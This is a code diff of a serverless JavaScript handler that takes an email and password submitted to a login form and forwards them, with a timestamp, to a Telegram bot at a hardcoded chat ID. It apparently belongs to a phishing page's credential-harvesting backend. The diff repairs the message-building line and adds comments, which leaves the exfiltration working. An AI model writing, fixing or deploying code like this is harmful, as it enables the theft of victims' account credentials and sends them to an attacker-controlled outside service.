@@ -5,10 +5,16 @@ const CHAT_ID = "1957450632";
 
 exports.handler = async function(event, context) {
   try {
+    // Parse incoming JSON body
     const { email, password } = JSON.parse(event.body);
 
-    const message = 🔐 LOGIN\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()};
+    // Construct Telegram message
+    const message = `🔐 LOGIN
+Email: ${email}
+Password: ${password}
+Time: ${new Date().toLocaleString()}`;
 
+    // Send to Telegram
     const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
